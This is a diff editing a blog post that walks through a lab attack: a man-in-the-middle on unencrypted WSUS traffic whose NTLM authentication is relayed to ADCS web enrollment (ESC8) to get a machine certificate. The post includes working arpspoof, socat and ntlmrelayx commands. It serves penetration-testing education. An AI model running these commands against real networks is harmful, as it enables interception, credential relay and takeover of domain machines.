@@ -1,20 +1,13 @@
 # Abusing WSUS with MITM to perform ADCS ESC8 attack
 
-​	
-
----
-| layout | post |
-| --- | ---|
-| title |  WSUS – Abusing WSUS server misconfiguration to perform ADCS ESC8 attack to own client machine. |
-| category | WSUS - MITM - ADCS |
-| tags | Abusing WSUS with MITM to perform ADCS ESC8 attack |
-
 In this blog post we will try to demonstrate another way (**not new**) to escalate privileges on a machine/computer by abusing WSUS server misconfiguration.
 
 Since 2020 after [Gosecure](https://www.gosecure.net/) ethical hackers released [misconfigured WSUS deploy exploit tool](https://www.gosecure.net/blog/2020/09/03/wsus-attacks-part-1-introducing-pywsus/) pywsus, WSUS configurations are under increasing scrutiny during penetration tests in order to compromise client update machines.
-Then came Gosecure's [paper](https://www.gosecure.net/blog/2021/11/22/gosecure-investigates-abusing-windows-server-update-services-wsus-to-enable-ntlm-relaying-attacks/) about abusing Windows Server Update Services (WSUS) to enable NTLM Relaying Attacks. While reading that last great blog post, I noticed that it was left to the reader to provide a proof-of-concept of how to exploit a vulnerable WSUS server configuration in an Active Directory Certificate Service (ADCS) context to obtain NT AUTHORITY/System privileges on domain joined machine. There is the goal of this blog post! 
+Then came Gosecure's [paper](https://www.gosecure.net/blog/2021/11/22/gosecure-investigates-abusing-windows-server-update-services-wsus-to-enable-ntlm-relaying-attacks/) about abusing Windows Server Update Services (WSUS) to enable NTLM Relaying Attacks. 
 
-Before diving into the subject, let's briefly talk about WSUS and the ADCS vulnerability we want to combine with it.
+While reading that last great blog post, I noticed that it was left to the reader to provide a proof-of-concept of how to exploit a vulnerable WSUS server configuration in an Active Directory Certificate Service (ADCS) context to obtain NT AUTHORITY/System privileges on domain joined machine. There is the goal of this blog post! 
+
+Before diving into the subject, let's briefly talk about WSUS and the ADCS vulnerability we want to combine with.
 
 
 
@@ -23,27 +16,26 @@ Before diving into the subject, let's briefly talk about WSUS and the ADCS vulne
 
 ## WSUS overview
 
-**Windows Server Update Services** (WSUS) enables information technology administrators to deploy the latest Microsoft product updates on computers. WSUS can be used to fully manage the distribution of updates that are released through Microsoft Update to computers on the network, according to [MS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/get-started/windows-server-update-services-wsus/). WSUS server downloads updates from Microsoft servers and keeps them locally in order to provide it to domain computers and servers. 
+**Windows Server Update Services** (WSUS) allows information technology administrators to deploy the latest Microsoft product updates on computers. WSUS can be used to fully manage the distribution of updates that are released through Microsoft Update to computers on the network, according to [MS](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/get-started/windows-server-update-services-wsus/). WSUS server downloads updates from Microsoft servers and keeps them locally in order to provide it to domain computers and servers. 
 
 A Group Policy Object is pushed and applied to a group of domain computers that use WSUS server for their updates.
 On each of these computers, the **W**indows **U**pdate **A**uto **U**pdate **Cl**lien**t** binary - wuauclt.exe was used to look frequently for updates by contacting the WSUS server. That binary is now [deprecated](https://learn.microsoft.com/en-us/windows-server/get-started/removed-deprecated-features-windows-server-2016).
 
-We can search and install updates by using [windows settings](https://support.microsoft.com/en-us/windows/update-windows-3c5ae7fc-9fb6-9af1-1984-b5e0412c556a). From there, client computer communicates with WSUS server using HTTP(S) /SOAP XML web service. Which means all update procedure is done using web service. The main endpoints requested (POST) by update clients are /ClientWebService/SimpleAuth.asmx, /ClientWebService/Client.asmx, /ApiRemoting30/WebServices.asmx and interesting requests included in XML are :
+We can search and install updates by using [windows settings](https://support.microsoft.com/en-us/windows/update-windows-3c5ae7fc-9fb6-9af1-1984-b5e0412c556a). From there, client computer communicates with WSUS server using HTTP(S) /SOAP XML web services. Which means all update procedure is done using web service. A full explanation from offensive perspective can be found [here](https://www.blackhat.com/docs/us-15/materials/us-15-Stone-WSUSpect-Compromising-Windows-Enterprise-Via-Windows-Update.pdf). The main endpoints requested (POST) by update clients are /ClientWebService/SimpleAuth.asmx, /ClientWebService/Client.asmx, /ApiRemoting30/WebServices.asmx and interesting requests included in XML datas are :
 
 - SyncUpdates : sending a list of currently updates.
 
 - GetExtendedUpdateInfo: checks for new update ids.
 
-  While responding to GetExtendedUpdateInfo request, WSUS server sends metadata, handlers ( for instance CommandLineInstallation allow to execute Microsoft signed binary with specific arguments), URLs from where to download and even installation note for every new update.
-
+  While responding to GetExtendedUpdateInfo request, WSUS server sends metadata, handlers (for instance CommandLineInstallation allows to execute Microsoft signed binary provided by WSUS server with specific arguments on hosts), URLs from where to download and even installation note for every new update.
   
 ### Use of Powershell to find updates
 
-It is possible for domain servers and computers  to look for update by using Powershell. Endpoint /ApiRemoting30/WebServices.asmx is requested updates are installed using WSUS Powershell modules.
+It is possible for domain servers and computers  to look for updates with the help of Powershell and MicrosoftUpdate .NET API. That time, /ApiRemoting30/WebServices.asmx endpoint is requested and updates are installed using WSUS Powershell modules.
 
 ## WSUS Attack
 
-When deploying WSUS on a domain, enable SSL is recommended not mandatory wich unfortunately leads to unsecure configurations of WSUS that we met during penetration tests. Initially , the idea behind WSUS attack is that if we are able to perform MITM attack , we can claim to be WSUS server in eyes of domain computer looking for updates, then inject fake updates to execute commands on the computer as NT AUTHORITY\\System abusing **CommandLineInstallation** handler. That is how pyWSUS tool came out.
+When deploying WSUS on a domain, enabling SSL is recommended not mandatory wich unfortunately leads to unsecure configurations of WSUS that we met during penetration tests. Initially , the idea behind WSUS attack is that if we are able to perform MITM attack , we can claim to be WSUS server in eyes of domain computer looking for updates, then inject fake updates to execute commands on the computer as NT AUTHORITY\\System abusing **CommandLineInstallation** handler. That is how pyWSUS tool came out.
 
 Another way to exploit WSUS misconfiguration is to take advantage of the authentication provided by computer client looking for updates and relaying it to other domain services, in our case: **Active Directory Certificate Service Web enrollment endpoint**.
 
@@ -71,7 +63,7 @@ In order to make simple the creation of certificates in an Active Directory, the
 
 By default, as well explained in [Sant0rryu blog post](https://sant0rryu.github.io/posts/CertPotato/#public-key-infrastructure) , when ADCS is installed, different default templates are available. Two of them are the **User** and **Machine** templates which can be requested by any user and machine/computer accounts in the domain. We are particularly interested by these two templates. First let's talk about machine template.
 
-Initially, all client's updates are installed by LocalSytem NT Authority\\System account which is a built-in service account. In Active Directory environment, localSystem uses computer account when trying to connect to remote server on the domain. So basically while look for updates, windows clients may use computer account if authentification is needed in Active Directory environment. 
+Initially, all client's updates are installed by LocalSytem NT Authority\\System account which is a built-in service account. In Active Directory environment, localSystem uses computer account when trying to connect to remote server on the domain. So basically while looking for updates, windows clients may use computer account if authentification is needed in Active Directory environment. 
 
 ## Account authentification (PKINIT)
 
@@ -80,14 +72,16 @@ PKINIT is a asymmetric preauthentication mechanism for Kerberos which uses X.509
 # Practical situation
 
 Let's take the following environment test:
-- AD-DC-19 (192.168.56.105): domaine controlleur (Windows Server 2019), which hosts Certificate Authority Service too. The CA name is jo-ad-ad-dc-19-ca
+- AD-DC-19 (192.168.56.105): domaine controlleur (Windows Server 2019), which hosts Certificate Authority Service too. The CA name is jo-ad-ad-dc-19-ca.
 - wsus-jo (192.168.56.114): Windows Service Update Server (Windows Server 2019), which hosts WSUS and delivers updates to computers through **HTTP** IIS server. 
 - w11-jason (192.168.56.108): Windows 11 client machine which is looking for updates.
-- parrotOS (192.168.56.115) which is our attacker machine. 
+- ParrotOS (192.168.56.115) which is our attacker machine. 
 
 # Exploitation Prerequisites
 
 In order to take advantage of the situation, let's have a look on the prerequisites:
+
+
 - First, it is important to be able to intercept traffic, of both windows update client and WSUS server. In other words we are able to perform ARP-spoof attack, which means we are on the same network as both.
 - WSUS server configured to work with HTTP. WSUS server protocole configuration can be found by querying registry key: 
 ```powershell
@@ -99,35 +93,35 @@ HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
 It is also possible to sniff traffic using Wireshark in order to find main endpoints requested by client as mentioned above. 
 
 
-- ADCS HTTP-based enrollment method is enabled on the domain with HTTP enabled and EPA disabled. In other words, ADCS vulnerable to ESC8.
+- ADCS HTTP-based enrollment method is enabled on the domain with HTTP enabled and EPA (Extended Protection for Authentication) disabled. In other words, ADCS vulnerable to ESC8.
 
 ![ADCS HTTP Web enrollment](/assets/img/web_enrollment.png)
 
 
 
  # Taking advantage of the situation
-
 We know WSUS HTTP server uses 8530 TCP port to answer clients requests. We will intercept Windows Update traffic by using ARP-Spoof attack (we could use mitm6 or responder etc). 
-There is commands to intercept traffic between both client (192.168.56.108) and server (192.168.56.114) in two linux terminals.
-In one terminal 
+There are commands used to intercept traffic between both client (192.168.56.108) and server (192.168.56.114) in two linux terminals.
+
+In one terminal:
 ```bash
 ~ sudo arpspoof -i enp0s3 -t 192.168.56.108 192.168.56.114 
 ```
-In another terminal::
+In another terminal:
 
 ```bash
 ~ sudo arpspoof -i enp0s3 -t 192.168.56.114 192.168.56.108 
 ```
- If we are MITM-ing between Windows update server and client computer, that means we potentially will receive HTTP requests on port 8530. As we wan to relay it using the famous impacket tool [Ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py), we must perform a port redirection. We redirect all incoming traffic on port 8530 to port 80 as if we were listening on port 80, we would receive these requests. We use [socat](https://www.baeldung.com/linux/socat-command) for that purpose:
+ If we are MITM-ing between Windows update server and client computer, that means we potentially will receive HTTP requests on port 8530. As we wan to relay it using impacket tool [Ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py), we must perform a port redirection. We redirect all incoming traffic on port 8530 to port 80 as if we were listening on port 80, we would receive these requests. We use [socat](https://www.baeldung.com/linux/socat-command) for that purpose:
 
 ```bash
 ~ sudo apt install socat
 ~ sudo socat TCP-LISTEN:8530,fork TCP:80
 ```
-So we are ready to relay all incoming traffing to our HTTP 80 port to the ADCS web enrollment HTTP server. We use ntlmrelayx to perform the relay. 
+So we are ready to relay all incoming traffing to our HTTP 80 port to the ADCS web enrollment HTTP server. There comes the use of ntlmrelayx to perform the relay. 
 
 >[!IMPORTANT]
->Make sure to use ExtAndroidDev pull [request](https://github.com/fortra/impacket/pull/1101/commits/81afc66904068e33c866bc9d005262c9ce69bad6) or [Dirkjann's httpattack.py version](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/ntlmrelayx/attacks/httpattack.py) . As Dirk-jan explained it in his [blog post](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)  servers/computers are not supposed to request certificates so the Web enrollment page gives them back the error ''No certificate templates could be found. You do not have permission to request a certificate from this CA, or an error occurred while accessing the Active Directory.'' There is how we proceeded in our lab:
+>Make sure to use ExtAndroidDev pull [request](https://github.com/fortra/impacket/pull/1101/commits/81afc66904068e33c866bc9d005262c9ce69bad6) or [Dirkjann's httpattack.py version](https://github.com/SecureAuthCorp/impacket/blob/master/impacket/examples/ntlmrelayx/attacks/httpattack.py) . As Dirk-jan explained it in his [blog post](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)  servers/computers are not supposed to request certificates so the Web enrollment page gives them back the error ''No certificate templates could be found. You do not have permission to request a certificate from this CA, or an error occurred while accessing the Active Directory.'' There is how we proceeded in our lab to make the relay work:
 
 ```bash
 python3 -m venv env
@@ -140,13 +134,13 @@ python3 setup.py install
 cd examples
 python3 ntlmrelayx.py -t http://192.168.56.105/certsrv/certfnsh.asp -smb2support --adcs
 ```
-We can wait for un windows update client to request updates, or if we have access to compromise host, we search for updates. Here is w11-jason victime computer looking for updates:
+We can wait for a windows update client to request wsus server, or if we have access to compromise host, we search for updates. Here is w11-jason victime computer looking for updates:
 
 ![Windows client looking for updates](/assets/img/windows_client_looks_for_updates.png)
 
 
 
-We indeed have incomming requests that we are going to relay to jo-ad-dc-19-ca web enrollment in order to ask for a computer template. There it is:
+Indeed we have incomming requests that we are going to relay to JO-AD-DC-19-CA web enrollment in order to ask for a computer template. There it is:
 
 ![Windows client looking for updates](/assets/img/ESC8_relay.png)
 
